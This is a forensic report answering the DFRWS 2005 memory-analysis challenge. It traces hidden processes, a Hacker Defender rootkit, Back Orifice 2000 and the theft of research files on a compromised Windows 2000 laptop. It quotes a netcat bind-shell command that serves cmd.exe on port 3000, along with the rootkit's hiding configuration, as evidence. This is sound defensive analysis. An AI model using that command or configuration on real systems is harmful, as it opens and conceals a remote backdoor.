# Report & Answers by Chris Betz

When approaching the DFRWS 2005 Forensics Challenge I quickly realized that simply searching within the memory dumps for strings and other indicators would be a very time-consuming process that would do little to improve our ability to analyze physical memory dumps. Instead of spending my time becoming familiar with the memory dumps provided by DFRWS I decided to discover whether I could build a more generic method to analyze memory images.

Using kd (kernel debugger) and livekd (thanks to Sysinternals) I debugged a windows 2000 SP4 kernel. Using the results of that debugging and analysis of the same machine's physical memory I built a program that parses Windows 2000 physical memory images, identified key structures, and can be used to assist in forensic analysis of Windows 2000 physical memory dumps.

Using this tool (which I call mem_parser for now) and a hex editor I was able to analyze the provided images to answer the forensics questions (and extract a large amount of additional information).

## Challenge Question 1: What hidden processes were running on the system, and how were they hidden?
### Synopsis
These processes are being hidden by Hacker Defender. Hacker Defender includes a driver that hooks Windows APIs and "infects" every running process. Please reference Holy_Father's own article (writer and maintainer of Hacker Defender) for specific details on his hooking mechanisms.

```
Image1 Hidden Running Processes:
PPID      PID       Name             Path
228       592:      dfrws2005.exe    c:\winnt\system32\dfrws2005.exe
600       668:      UMGR32.EXE       c:\winnt\system32\UMGR32.EXE
592       1096:     nc.exe           c:\winnt\system32\nc.exe
                                     -L Ðp 3000 -t -e cmd.exe
Image2 Hidden Running Processes:
PPID      PID       Name             Path
228       472:      dfrws2005.exe    c:\winnt\system32\dfrws2005.exe
228       548:      UMGR32.EXE       c:\winnt\system32\UMGR32.EXE
472       504:      nc.exe           c:\winnt\system32\nc.exe
                                     -L Ðp 3000 -t -e cmd.exe
```
### Process of Discovery
Using my memory image analysis program (mem_parser) I identified the _EPROCESS_ structures for all processes running while the process dump was taken.Mem_parser uses the UniqueProcessId, InheritedFromUniqueProcessId, and ImageFileName to generate process lists from the two memory dumps:

```
dfrws2005-physical-memory1.dmp
PPID      PID:      Name
0         0:        Idle
0         8:        System
8         156:      smss.exe
144       164:      winlogon.exe
144       168:      csrss.exe
156       176:      winlogon.exe
156       180:      csrss.exe
176       228:      services.exe
176       240:      lsass.exe
1112      284:      dd.exe
820       324:      helix.exe
228       408:      svchost.exe
228       436:      spoolsv.exe
228       464:      Avsynmgr.exe
228       480:      svchost.exe
228       540:      regsvc.exe
228       552:      MSTask.exe
228       592:      dfrws2005.exe
464       612:      VsStat.exe
464       628:      Avconsol.exe
600       668:      UMGR32.EXE
228       672:      WinMgmt.exe
800       820:      Explorer.Exe
820       964:      Apoint.exe
820       972:      HKserv.exe
820       988:      DragDrop.exe
820       1008:     alogserv.exe
820       1012:     tgcmd.exe
820       1048:     PcfMgr.exe
408       1064:     JogServ2.exe
864       1072:     Apntex.exe
820       1076:     cmd.exe
592       1096:     nc.exe
324       1112:     cmd2k.exe
324       1132:     cmd2k.exe

dfrws2005-physical-memory2.dmp
PPID      PID:      Name
0         0:        Idle
0         8:        System
8         152:      smss.exe
8         156:      smss.exe
144       168:      csrss.exe
152       176:      winlogon.exe
152       180:      csrss.exe
156       180:      csrss.exe
176       228:      services.exe
176       240:      lsass.exe
840       304:      helix.exe
228       404:      svchost.exe
228       432:      spoolsv.exe
228       460:      Avsynmgr.exe
228       472:      dfrws2005.exe
228       492:      svchost.exe
472       504:      nc.exe
228       548:      UMGR32.EXE
228       560:      regsvc.exe
228       576:      MSTask.exe
460       652:      VsStat.exe
460       708:      Avconsol.exe
228       720:      WinMgmt.exe
304       728:      cmd2k.exe
212       840:      Explorer.Exe
840       892:      DragDrop.exe
840       920:      Apoint.exe
840       956:      HKserv.exe
840       968:      JogServ2.exe
840       992:      alogserv.exe
840       1012:     tgcmd.exe
1000      1020:     Apntex.exe
304       1052:     cmd2k.exe
840       1064:     PcfMgr.exe
1052      1188:     dd.exe
```

Using these process-lists I began to identify the processes. I used the processes .exe file images from memory and compared them with known images to identify and verify each process. I began by dumping the memory space of all of the processes using mem_parser. Mem_parser grabs the DirectoryTableBase element of the _KPROCESS structure embedded in each process' _EPROCESS structure. This address is the physical addresses (within the memory) where the base table for the process virtual memory space begins. Windows 2000 (not running a PAE kernel) allocates the first 2GB to the process and the second 2GB of the process' 4GB virtual memory to shared system memory. I chose to tell Mem_parser to walk the first 2GB of process memory. Any memory paged-in (in the physical memory dump) I copied to a file.

I was quickly able to parse through the processes from both dumps. Comparing the strings in the paged-in parts of the .exe image to reference binaries from clean Windows installations and other vendor downloaded software, I was able to verify the following:

```
dfrws2005-physical-memory1.dmp
PPID     PID:      Name
0        0:        Idle              - OS process - no exe
0        8:        System            - OS process
8        156:      smss.exe          - MS smss.exe
144      164:      winlogon.exe      - MS winlogon.exe
144      168:      csrss.exe         - MS csrss
156      176:      winlogon.exe      - MS winlogon.. 2 Window Stations?
156      180:      csrss.exe         - MS csrss.. 2 Window Stations
176      228:      services.exe      - MS services.exe
176      240:      lsass.exe         - MS lsass.exe
1112     284:      dd.exe            - dd.exe matches the Helix CD
820      324:      helix.exe         - Helix CD helix.exe
228      408:      svchost.exe       - MS svchost.exe
228      436:      spoolsv.exe       - MS spoolsv.exe
228      464:      Avsynmgr.exe      - McAfee Anti-virus
228      480:      svchost.exe       - MS svchost.exe
228      540:      regsvc.exe        - MS regsvc
228      552:      MSTask.exe        - MS MSTask.exe
228      592:      dfrws2005.exe     - !!! Not Normal !!!
464      612:      VsStat.exe        - McAfee
464      628:      Avconsol.exe      - McAfee
600      668:      UMGR32.EXE        - !!! Not Normal !!!
228      672:      WinMgmt.exe       - MS WinMgmt.exe
800      820:      Explorer.Exe      - MS Explorer.exe
820      964:      Apoint.exe        - Alps Pointing Device Driver
820      972:      HKserv.exe        - Sony Hot Key config. utility
820      988:      DragDrop.exe      - Sony Hot Key config. utility
820      1008:     alogserv.exe      - Sony Drag and Drop utility
820      1012:     tgcmd.exe         - Comcast @Home
820      1048:     PcfMgr.exe        - Sony power Schemes Manager
408      1064:     JogServ2.exe      - Sony Jog Dial
864      1072:     Apntex.exe        - Alps Pointing Device Driver
820      1076:     cmd.exe           - MS Cmd Prompt ???is this ok???
592      1096:     nc.exe            - NetCat !!! Started by 1096 !!!
324      1112:     cmd2k.exe         - Helix cmd2k.exe
324      1132:     cmd2k.exe         - Helix cmd2k.exe

dfrws2005-physical-memory2.dmp
PPID     PID:      Name
0        0:        Idle              - OS see above
0        8:        System            - OS
8        152:      smss.exe          - MS
8        156:      smss.exe          - MS
144      168:      csrss.exe         - MS
152      176:      winlogon.exe      - MS
152      180:      csrss.exe         - MS
156      180:      csrss.exe         - MS
176      228:      services.exe      - MS
176      240:      lsass.exe         - MS
840      304:      helix.exe         - Helix
228      404:      svchost.exe       - MS
228      432:      spoolsv.exe       - MS
228      460:      Avsynmgr.exe      - McAfee
228      472:      dfrws2005.exe -   - !!!
228      492:      svchost.exe       - MS
472      504:      nc.exe            - !!!
228      548:      UMGR32.EXE        - !!!
228      560:      regsvc.exe        - MS
228      576:      MSTask.exe        - MS
460      652:      VsStat.exe        - McAfee
460      708:      Avconsol.exe      - McAfee
228      720:      WinMgmt.exe       - MS
304      728:      cmd2k.exe         - Helix
212      840:      Explorer.Exe      - MS
840      892:      DragDrop.exe      - Sony
840      920:      Apoint.exe        - Alps
840      956:      HKserv.exe        - Sony
840      968:      JogServ2.exe      - Sony
840      992:      alogserv.exe      - McAfee
840      1012:     tgcmd.exe         - Comcast
1000     1020:     Apntex.exe        - Alps
304      1052:     cmd2k.exe         - Helix
840      1064:     PcfMgr.exe        - Sony
1052     1188:     dd.exe            - Helix
```

This analysis revealed several interesting processes worth further review. Processes of interest to me:

```
Image1:
228      592:      dfrws2005.exe     - !!!! Not Normal !!!
600      668:      UMGR32.EXE        - !!! Not Normal !!!
820      1076:     cmd.exe           - MS Cmd Prompt ??? is this ok???
592      1096:     nc.exe            - NetCat !!! Started by 1096 !!!

Image2:
228      472:      dfrws2005.exe     - !!!
472      504:      nc.exe            - !!!
228      548:      UMGR32.EXE         -!!!
```

Inspection of the specific memory space and downloading from the internet indicated that dfrws2005.exe was Hacker Defender. UMGR32.exe was Back Orifice 2000. Inspection of cmd.exe showed:

```
Image 1
String                                    Dump Addr     Process Addr
\WINNT\System32\cmd.exe - netstat-an      009481CC      001351CC
```
Note that cmd.exe's parent process was explorer.exe.  I couldn't find any evidence that this process was harmful, and it appears it may have been part of the Administrator's troubleshooting.

The Hacker Defender Processes are very interesting. Part of hacker defender includes a system driver which accomplishes file, process, registry key, and network connection hiding. I chose to dump the hacker defender processes again, this time instructing mem_parser to include the shared system memory space.

Hacker defender has 3 files (at minimum), a driver (.sys) which handles hiding, an executable (.exe) which handles triggering, and a .ini file which contains configuration information. The Image2:PID472 process has what appears to be a pretty clear snapshot of the ini file's data. (See Appendix 1) The Image1:PID668 Back Orifice 2000 (BO2K) also seems to contain a clear snapshot of the ini file's data. (See Appendix 2)

Having dealt with Hacker Defender's ini file before (and using the help file for reference) I think the following is happening. On the other hand, one of the down sides of looking at a processes memory is that you don't have a complete understanding of how a process stores data, and I didn't have an opportunity to mock up a Hacker Defender (hxdef) implanted box to check. Regardless it appears hacker defender's configuration is:

```
Filename: dfrws2005.ini
HiddenTable (Hide all Processes Dirs and Files with these values)
dfrws*
rcmd.exe
eoghan
umgr32.exe

RootProcesses (Immune against infection... can see hidden things)
dfrws*
rcmd.exe
nc.exe

HiddenServices (List of hidden services and drivers)
DFRW*

HiddenRegkeys (Hidden registry keys)
DFRWS2005
LEGACY_DFRWS2005
DFRWSDRV2005
LEGACY_DFRWSDRV2005

HiddenRegValues (Hidden registry values)

StartupRun (Files executed @ startup)
C:\winnt\system32\nc.exe" -L -p 3000 -t -e cmd.exe

FreeSpace (Amount of space to add to free space calculation for a drive)

HiddenPorts (Hidden ports from OpPorts, FPort, Netstat, etc...)
TCP: 1313, 3000

Settings (various settings... see below)
Password = dfrws2005
BackdoorShell = dfrws.exe
FileMappingName = _.-=[DFRWS2005]=-._
ServiceName = DFRWS2005
ServiceDisplayName = DFRWS2005 Challenge
ServiceDescription = memory examination challenge
DriverName = DFRWSDRV2005
DriverFileName = dfrwsdrv.sys
```
These rules instruct Hacker Defender's driver to hide (among other things) three of the running processes: dfrws2005.exe, UMGR32.EXE, and nc.exe. Hacker Defender hooks selected Windows API calls by inserting itself into all running processes (except for those in the "RootProcesses" list. For further details on Hacker Defenders hiding mechanisms please reference Holy_Father's (Hacker Defender's creator) article.

## Challenge Question 2: What other evidence of the intrusion can be extracted from the memory dumps?
### Synopsis

There are indications that the initial access to the host was accomplished using the Metasploit framework on Sat Jun 04 2005 at approximately 21:55:10. When a host is exploited using a metasploit framework and an .exe payload is used, the payload created on the compromised host is called c:\Metasploit.exe. This file is referenced in the MAC times at the start of the probable exploit as well as in the UMGR32.exe memory space from Image1:PID668.

### Process of Discovery
There are several indications regarding the original exploit. One was found in the MAC times searching using the hidden processes and associated files as original references. Some of the relevant data is:

```
Sat Jun 04 2005 21:55:10
155648 m.. -/-r-xr-xr-x 0   0   35         /metasploit.exe
                                           (METASP~1.EXE)
155648 m.. -/-r-xr-xr-x 0   0   16698193   /WINNT/system32/UMGR32.EXE

Sat Jun 04 2005 21:59:10
3342 ..c -/--wx-wx-wx   0   0   16698237   /WINNT/system32/dfrwsdrv.sys
3342 ..c -/-rwxrwxrwx   0   0   16698229   /WINNT/system32/_frwsdrv.sys
                                           (deleted)
3342 ..c -/-rwxrwxrwx   0   0   16698236   /WINNT/system32/_frwsdrv.sys
                                           (deleted)
854 m..  -/-rwxrwxrwx   0   0   16698216   /WINNT/system32/dfrws2005.ini
                                           (DFRWS2~1.INI)
114688 ..c -/-rwxrwxrwx 0   0   16698230   /WINNT/system32/fport.exe

Sat Jun 04 2005 21:59:12
59392 ..c -/-rwxrwxrwx  0   0   16698231   /WINNT/system32/nc.exe
3342 m.. -/-rwxrwxrwx   0   0   16698229   /WINNT/system32/_frwsdrv.sys
                                           (deleted)

Sat Jun 04 2005 21:59:14
86016 ..c -/-rwxrwxrwx  0   0   16698233   /WINNT/system32/pslist.exe
26624 ..c -/-rwxrwxrwx  0   0   16698232   /WINNT/system32/pskill.exe
59392 m.. -/-rwxrwxrwx  0   0   16698231   /WINNT/system32/nc.exe
114688 m.. -/-rwxrwxrwx 0   0   16698230   /WINNT/system32/fport.exe

Sat Jun 04 2005 21:59:16
70144 ..c -/-rwxrwxrwx  0   0   16698235   /WINNT/system32/dfrws2005.exe
                                           (DFRWS2~1.EXE)
86016 m.. -/-rwxrwxrwx  0   0   16698233   /WINNT/system32/pslist.exe
26624 m.. -/-rwxrwxrwx  0   0   16698232   /WINNT/system32/pskill.exe

Sat Jun 04 2005 21:59:18
70144 m.. -/-rwxrwxrwx  0   0   16698235   /WINNT/system32/dfrws2005.exe 
                                           (DFRWS2~1.EXE)

Sat Jun 04 2005 22:00:56
3342 m.. -/--wx-wx-wx   0   0   16698237   /WINNT/system32/dfrwsdrv.sys
3342 m.. -/-rwxrwxrwx   0   0   16698236   /WINNT/system32/_frwsdrv.sys
                                           (deleted)
```
Of interest is the fact that the metasploit.exe was not cleaned up (deleted). This may be a reflection of the attackers familiarity with the tool, degree of care and caution or fear of detection. Further analysis of this binary (if it is a "call-back" payload) may provide concrete evidence of the attacker IP address.

Based upon the presence of metasploit.exe in the UMGR32.exe memory space (Image1:PID668), I believe it is likely that UMGR32.exe was used as the initial command and control tool on the host. UMGR32.exe was likely used to move the Hacker Defender (dfrws2005.exe, etc.) toolkit to the compromised host and to execute/install it. Visit the Metasploit Web site for supporting on the way its exploits operate, including the exe payload. The DFRWS 2005 Forensics Challenge references to metasploit occur in Image1:PID668 (UMGR32.exe) as follows:

```
Image1:PID668 (UMGR32.exe)
String                  Dump Addr        Process Addr
C:\metasploit.exe       0333BFC9         00147FC9
C:\metasploit.exe       072B7DF9         00174DF9
```

## Challenge Question 3: Why did "plist.exe" and "fport.exe" not work on the compromised system?
### Synopsis
Fport.exe and plist.exe are prevented from working by Hacker Defender. Hacker Defender hooks Windows API calls made by processes and filters out its hidden information. It hides network ports, processes, registry keys, and files.

### Process of Discovery
As noted in the answer to #1 it is evident that Hacker Defender is installed on the subject machine. Hacker Defender is designed to hide processes, network ports, registry keys, and files. In the Hacker Defender documentation fport is specifically listed "Hidden Ports is a list of open ports that you want to hide from applications like OpPorts, FPort..." as one software from which it successfully hides.

While Hacker Defender does not specifically list plist, it is designed to hide from tasklist: "Programs in this list will be hidden in tasklist" and plist is similarly defeated. Read Holy_Father's (Hacker Defender's creator) detailed article for more information.

## Challenge Question 4: Was the intruder specifically seeking Professor Goatboy's research materials?
### Synopsis
I'm not sure. I have not developed any specific evidence that Professor Goatboy was specifically targeted. However, there are several factors that increase my suspicious that he may have been the intentional target of this attack:

**Date/Time of the Attack:**

Professor Goatboy began work the last week of May. The MAC times indicate he was exploited on 4 June. This occurred after Professor Goatboy owned the reformatted laptop, so it is unlikely a previous owner was specifically targeted.
**Hacker File Collection:**

The memory images copied showed that UMGR32.exe (BO2K) was tasked to collect files from Professor Goatboy's files including those from his "New Research" directory. It is possible that the hacker stumbled upon this and got lucky, however it does show that he is collecting the key files that the Professor was trying to protect.

While I did not discover any specific evidence showing that Professor Goatboy was the victim of a targeted attack it appears that the attack was aware of his data on the laptop and was actively seeking to retrieve it. Furthermore the timing of the attack (shortly after the Professor started his new job) leads me to be especially suspicious that this attack may have been targeted at him.

### Process of Discovery
The date/time of probable exploit was determined using the MAC times shown in the Process of Discovery for question #2. The hacker file collection will be covered in more detail in question #5.

## Challenge Question 5: Did the intruder obtain the Professor's research?
### Synopsis
Very probably. While I cannot prove that the intruder has Professor Goatboy's research in his/her possession the data in UMGR32.exe's (BO2K) memory space shows that it is extremely likely that the Professor's data has been stolen from his computer.

### Process of Discovery
UMGR32.exe's (BO2K) memory space refers to the Professor's data many times. BO2K is capable of retrieving files. For details about BO2K's capabilities, please see the Back Orifice 2000 feature list. Several of the references to the Professor's data— which are duplicated throughout PID668's memory space— include:

```
Image1:PID668 (UMGR32.exe)
String                   Dump Addr          Process Addr
See next                 057915F0           0013F5F0
c:\Documents and Settings\Administrator\My Documents\New Research - 
Private!\Do not distribute\Semaphores Using Stochastic Configurations.pdf

See next                 0754802A           0014C02A
c:\Documents and Settings\Administrator\My Documents\New Research - 
Private!\Do not distribute\P2P Model Checking.pdf

See next                 0754846C           0014C46C
SEMAPH~1.PDF  98629 -A----- 05-30-2005 12:47 Semaphores Using Stochastic
Configurations.pdf

See next                 07548C4C           0014CC4C
INTUIT~1.PDF  87984 -A----- 05-30-2005 12:49 Intuitive Unification of
Fiber-Optic Cables.pdf

See next                 0738A70A           0014E70A
c:\Documents and Settings\Administrator\My Documents\New Research - 
Private!\Do not distribute\Semaphores Using Stochastic Configurations.pdf
```

## Challenge Question 6: What computer was the intrusion launched from?
### Synopsis
I have not yet been able to develop a netstat capability for mem_parser. However, in UMGR32.exe are multiple references to IP addresses apparently related to file transfer. Without knowing the IP address of the laptop I cannot determine which IP address is the attackers, but either 192.168.0.2 or 192.168.0.5 is a good starting point to look for the attacker.

As noted in Process of Discovery for question 2, it is likely that the IP address of the attacker can be found hard-coded into C:\metasploit.exe if metasploit.exe is a call-back exploit payload.

### Process of Discovery
Please see question 2 for more details on metasploit and call-back payload. Some of the relevant UMGR32.exe strings include:

```
Image1:PID668 (UMGR32.exe)
String                   Dump Addr          Process Addr
192.168.0.2:1069         057914F0           0013F4F0
192.168.0.2:44444        029A562C           0014962C

See Next                 029A599C           0014999C
File emit started from: 192.168.0.2:1069,STCPIO,NULL,NULLAUTH

See Next                 029A5A0C           00149A0C
File emit started from: 192.168.0.2:1069,STCPIO,NULL,NULLAUTH

See Next                 065070B4           0014B0B4
File emit started from: 192.168.0.2:1069,STCPIO,NULL,NULLAUTH

92.168.000.005           065071A5           0014B1A5
92.168.000.005           0754884D           0014C84D
92.168.000.005           0554908D           0014D08D
192.168.0.2:1069         0554951C           0014D51C
```

## Challenge Question 7: Is there any indication of who the intruder might be?
### Synopsis
The dfrws2005.exe (Hacker Defender) binary includes the name Mario many times throughout the memory space. In addition, the UMGR32.exe (BO2K) memory space includes similar references to Mario. Though not conclusive this name is one of several logical starting points for an investigation.

### Process of Discovery
During analysis for answer #1 I noted the name Mario many times in the memory space. This name is not in other compilations I have found of Hacker Defender. Specific locations include:

```
Image2:PID472 (dfrws2005.exe)
String     Dump Addr    Process Addr
mario      01A481A7     001381A7
mario      01A489DF     001389DF
mario*     01A48AA7     00138AA7
mario      0018C4C7     001394C7
mario      00125447     80125447
mario0     001254EF     801254EF
mario      0018C4C7     8018C4C7
mario      00206313     80206313

Image2:PID548 (UMGR32.exe)
String     Dump Addr    Process Addr
mario      051E47BF     001377BF
mario      0534D24F     0013824F
Appendix 1: Selected Strings from Image 2:PID 472 (dfrws2005.exe)
Starting Image 2 Dump Address: 002D9054
Starting Process Memory Address: 009A0054

Process Page-in       String
Dump Address
000DF054 000DF054         memory examination challenge
000DF080 000DF080         dfrws2005.ini
000DF09C 000DF09C         DRIVERNAME=DFRWSDRV2$
000DF0C0 000DF0C0         [Hidden Tabl@
000DF0DC 000DF0DC         [Hidden Tabl\
000DF0F8 000DF0F8         [HIDDEN TABLE]
000DF114 000DF114         SERVICEDISPLAYNAME=DFRWS2005 CHALLEN4
000DF148 000DF148         [Root Processes]T
000DF168 000DF168         [Root Processes]t
000DF188 000DF188         [ROOT PROCESSES]
000DF1A8 000DF1A8         d<r>f<w>:s<*
000DF1C4 000DF1C4         drfw0
000DF1D8 000DF1D8         drfwD
000DF1EC 000DF1EC         DRFWS*
000DF200 000DF200         <\r\c:\m\d.\e\x\x
000DF220 000DF220         rcmd.exe
000DF238 000DF238         RCMD.EXE
000DF250 000DF250         <n|c.ex\
000DF290 000DF290         NC.EXE
000DF2A4 000DF2A4         [Hidden Services 
000DF2C4 000DF2C4         [Hidden Services@
000DF2E4 000DF2E4         [HIDDEN SERVICES]
000DF304 000DF304         DriverName=DFRWSDRV2005
000DF32C 000DF32C         DFRW<
000DF340 000DF340
000DF358 000DF358         [Hidden RegKeys]
000DF378 000DF378         [Hidden RegKeys]@
000DF398 000DF398         [HIDDEN REGKEYS]
000DF3CC 000DF3CC         D:"FR<WS2\00
000DF3E8 000DF3E8         DFRWS2004
000DF400 000DF400         DFRWS200L
000DF410 000DF410         DFRWS2005
000DF51C 000DF51C         DFRWS200h
000DF548 000DF548         LEGACY_DFRWS2005 
000DF568 000DF568         LEGACY_DFRWS2005@
000DF588 000DF588         LEGACY_DFRWS2005
000DF5A0 000DF5A0         LEGACY_DFRWS2005
000DF6AC 000DF6AC         DFRWSDRV2005
000DF6C8 000DF6C8         DFRWSDRV2005
000DF6E4 000DF6E4         DFRWSDRV2005T
000DF6F8 000DF6F8         DFRWSDRV2005
000DF804 000DF804         LEGACY_DFRWSDRV2 
000DF824 000DF824         LEGACY_DFRWSDRV2
000DF844 000DF844         LEGACY_DFRWSDRV2005
000DF864 000DF864         FRWSDRV2005
000DF968 000DF968         DFRWSDRV2005
000DF984 000DF984
000DF9A0 000DF9A0         DFRWSDRV2005
000DF9BC 000DF9BC         LEGACY_DFRWS2005<
000DF9DC 000DF9DC         LEGACY_DFRWS2005\
000DF9FC 000DF9FC         LEGACY_DFRWSDRV2005
000DFA1C 000DFA1C         LEGACY_DFRWSDRV2005
000DFA3C 000DFA3C         [Hidden RegValue 
000DFA5C 000DFA5C         [Hidden RegValue@
000DFA7C 000DFA7C         [HIDDEN REGVALUE
000DFA9C 000DFA9C         DFRWS2005 Challenge
000DFABC 000DFABC         
000DFAD8 000DFAD8         [Free Space]
000DFAF4 000DFAF4         [Free Space]8
000DFB10 000DFB10         [FREE SPACE]
000DFB2C 000DFB2C         [Hidden Port
000DFB48 000DFB48         [Hidden Port8
000DFB64 000DFB64         [HIDDEN PORTS]
000DFB80 000DFB80         TCP:1313,300
000DFB9C 000DFB9C         TCP:1313,3008
000DFBB8 000DFBB8         TCP:1313,300T
000DFBD4 000DFBD4         1313,3000
000DFBEC 000DFBEC         1313,300
000DFC04 000DFC04         1313,
000DFC18 000DFC18         1313@
000DFC2C 000DFC2C         3000T
000DFC40 000DFC40         3000h
000DFC54 000DFC54         3000|
000DFC7C 000DFC7C         [Settings] 
000DFC98 000DFC98         [Setting4
000DFCB0 000DFCB0         [SETTINGS]
000DFCC8 000DFCC8         Password=dfrws2005
000DFCE8 000DFCE8         dfrws2008
000DFD00 000DFD00         dfrws200\
000DFD18 000DFD18         DRIVERFILENAME=DFRWSDRV.
000DFD40 000DFD40         dfrws
000DFD46 000DFD46         $.exe
000DFD58 000DFD58         FileMappingName=_.-=[DFRWS2005]=0
000DFD88 000DFD88         FILEMAPPINGNAME=_.-=[DFRWS2005]=
000DFDB8 000DFDB8         _.-=[DFRWS2005]=-._
000DFDD8 000DFDD8         ServiceName=DFRWS200$
000DFDFC 000DFDFC         SERVICENAME=DFRWS200H
000DFE20 000DFE20         DFRWS2005
000DFE38 000DFE38         DFRWSDRV2005
000DFE54 000DFE54         D:riv>erFileNam/e=dfrwsdrv.s,
000DFE80 000DFE80         DriverFileName=dfrwsdrv.T
000DFEA8 000DFEA8         dfrwsdrv.sys
000DFEC4 000DFEC4         %cmd%
000DFED8 000DFED8         C:\WINNT\system32\cmd.exe
000DFF00 000DFF00         C:\WINNT\system32\
000DFF20 000DFF20         %sysdir%
000DFF38 000DFF38         C:\WINNT\System32\
000DFF58 000DFF58         %windir%
000DFF70 000DFF70         C:\WINNT\
000DFF88 000DFF88         %tmpdir%
000DFFA0 000DFFA0         C:\WINNT\TEMP\
000DFFBC 000DFFBC         /[/H/idd\en Ser:vi"c$
000DFFE0 000DFFE0         [Hidden ServicesD
000E0000 000E0000         [Hidden Servicesd
000E0020 000E0020         [HIDDEN SERVICES
000E0040 000E0040         D>:FR"W/
000E0094 000E0094
000E00AC 000E00AC
000E00C4 000E00C4         [Hi:dden R/">>egKeys,
000E00E8 000E00E8         [Hidden RegKeys]L
000E0108 000E0108         [Hidden RegKeys]l
000E0128 000E0128         [HIDDEN REGKEYS]
000E0148 000E0148         D:"FR<WS2\00
000E0164 000E0164         DFRWS200
000E017C 000E017C         DFRWS200
000E0194 000E0194         DFRWS200
000E01AC 000E01AC         LE":GACY_D\FRWS2\005
000E01D0 000E01D0         LEGACY_DFRWS20054
000E01F0 000E01F0         LEGACY_DFRWS2005T
000E0210 000E0210         LEGACY_DFRWS2005t
000E0230 000E0230         D:FR:WSDRV/2
000E024C 000E024C         DFRWSDRV2005
000E0268 000E0268         DFRWSDRV2005
000E0284 000E0284         DFRWSDRV2005
000E02A0 000E02A0         LE":GACY_DF\RWSDR/V20\05
000E02C8 000E02C8         LEGACY_DFRWSDRV2,
000E02E8 000E02E8         LEGACY_DFRWSDRV2L
000E0308 000E0308         LEGACY_DFRWSDRV2l
000E0328 000E0328
000E0344 000E0344
000E0360 000E0360         \"[Hid:den\>:RegValues]
000E0388 000E0388         [Hidden RegValue
000E03A8 000E03A8         [Hidden RegValue
000E03C8 000E03C8         [HIDDEN REGVALUE,
000E03E8 000E03E8         ///L
000E0408 000E0408         h
000E0424 000E0424         :[St/\artup\Run
000E0444 000E0444         [Startup Run]
000E0460 000E0460         [Startup Run]
000E047C 000E047C         [STARTUP RUN]
000E0498 000E0498         "c:\winnt\system32\nc.exe" -L
                          -p 3000 -t -e cmd.exe
000E04D8 000E04D8         c:\winnt\system32\nc.exe?-L -p 3000 -t 
                          -e cmd.ex@
000E0518 000E0518         c:\winnt\system32\nc.exe
000E0540 000E0540         -L -p 3000 -t -e cmd.exe
000DF054 000DF054         memory examination challenge
000DF080 000DF080         dfrws2005.ini
000DF09C 000DF09C         DRIVERNAME=DFRWSDRV2$
000DF0C0 000DF0C0         [Hidden Tabl@
000DF0DC 000DF0DC         [Hidden Tabl\
000DF0F8 000DF0F8         [HIDDEN TABLE]
000DF114 000DF114         SERVICEDISPLAYNAME=DFRWS2005 CHALLEN4
000DF148 000DF148         [Root Processes]T
000DF168 000DF168         [Root Processes]t
000DF188 000DF188         [ROOT PROCESSES]
000DF1A8 000DF1A8         d<r>f<w>:s<*
000DF1C4 000DF1C4         drfw0
000DF1D8 000DF1D8         drfwD
000DF1EC 000DF1EC         DRFWS*
000DF200 000DF200         <\r\c:\m\d.\e\x\x
000DF220 000DF220         rcmd.exe
000DF238 000DF238         RCMD.EXE
000DF250 000DF250         <n|c.ex\
000DF290 000DF290         NC.EXE
000DF2A4 000DF2A4         [Hidden Services 
000DF2C4 000DF2C4         [Hidden Services@
000DF2E4 000DF2E4         [HIDDEN SERVICES]
000DF304 000DF304         DriverName=DFRWSDRV2005
000DF32C 000DF32C         DFRW<
000DF340 000DF340
000DF358 000DF358         [Hidden RegKeys]
000DF378 000DF378         [Hidden RegKeys]@
000DF398 000DF398         [HIDDEN REGKEYS]
000DF3CC 000DF3CC         D:"FR<WS2\00
000DF3E8 000DF3E8         DFRWS2004
000DF400 000DF400         DFRWS200L
000DF410 000DF410         DFRWS2005
000DF51C 000DF51C         DFRWS200h
000DF548 000DF548         LEGACY_DFRWS2005 
000DF568 000DF568         LEGACY_DFRWS2005@
000DF588 000DF588         LEGACY_DFRWS2005
000DF5A0 000DF5A0         LEGACY_DFRWS2005
000DF6AC 000DF6AC         DFRWSDRV2005
000DF6C8 000DF6C8         DFRWSDRV2005
000DF6E4 000DF6E4         DFRWSDRV2005T
000DF6F8 000DF6F8         DFRWSDRV2005
000DF804 000DF804         LEGACY_DFRWSDRV2 
000DF824 000DF824         LEGACY_DFRWSDRV2
000DF844 000DF844         LEGACY_DFRWSDRV2005
000DF864 000DF864         FRWSDRV2005
000DF968 000DF968         DFRWSDRV2005
000DF984 000DF984
000DF9A0 000DF9A0         DFRWSDRV2005
000DF9BC 000DF9BC         LEGACY_DFRWS2005<
000DF9DC 000DF9DC         LEGACY_DFRWS2005\
000DF9FC 000DF9FC         LEGACY_DFRWSDRV2005
000DFA1C 000DFA1C         LEGACY_DFRWSDRV2005
000DFA3C 000DFA3C         [Hidden RegValue 
000DFA5C 000DFA5C         [Hidden RegValue@
000DFA7C 000DFA7C         [HIDDEN REGVALUE
000DFA9C 000DFA9C         DFRWS2005 Challenge
000DFABC 000DFABC
000DFAD8 000DFAD8         [Free Space]
000DFAF4 000DFAF4         [Free Space]8
000DFB10 000DFB10         [FREE SPACE]
000DFB2C 000DFB2C         [Hidden Port
000DFB48 000DFB48         [Hidden Port8
000DFB64 000DFB64         [HIDDEN PORTS]
000DFB80 000DFB80         TCP:1313,300
000DFB9C 000DFB9C         TCP:1313,3008
000DFBB8 000DFBB8         TCP:1313,300T
000DFBD4 000DFBD4         1313,3000
000DFBEC 000DFBEC         1313,300
000DFC04 000DFC04         1313,
000DFC18 000DFC18         1313@
000DFC2C 000DFC2C         3000T
000DFC40 000DFC40         3000h
000DFC54 000DFC54         3000|
000DFC7C 000DFC7C         [Settings] 
000DFC98 000DFC98         [Setting4
000DFCB0 000DFCB0         [SETTINGS]
000DFCC8 000DFCC8         Password=dfrws2005
000DFCE8 000DFCE8         dfrws2008
000DFD00 000DFD00         dfrws200\
000DFD18 000DFD18         DRIVERFILENAME=DFRWSDRV.
000DFD40 000DFD40         dfrws
000DFD46 000DFD46         $.exe
000DFD58 000DFD58         FileMappingName=_.-=[DFRWS2005]=0
000DFD88 000DFD88         FILEMAPPINGNAME=_.-=[DFRWS2005]=
000DFDB8 000DFDB8         _.-=[DFRWS2005]=-._
000DFDD8 000DFDD8         ServiceName=DFRWS200$
000DFDFC 000DFDFC         SERVICENAME=DFRWS200H
000DFE20 000DFE20         DFRWS2005
000DFE38 000DFE38         DFRWSDRV2005
000DFE54 000DFE54         D:riv>erFileNam/e=dfrwsdrv.s,
000DFE80 000DFE80         DriverFileName=dfrwsdrv.T
000DFEA8 000DFEA8         dfrwsdrv.sys
000DFEC4 000DFEC4         %cmd%
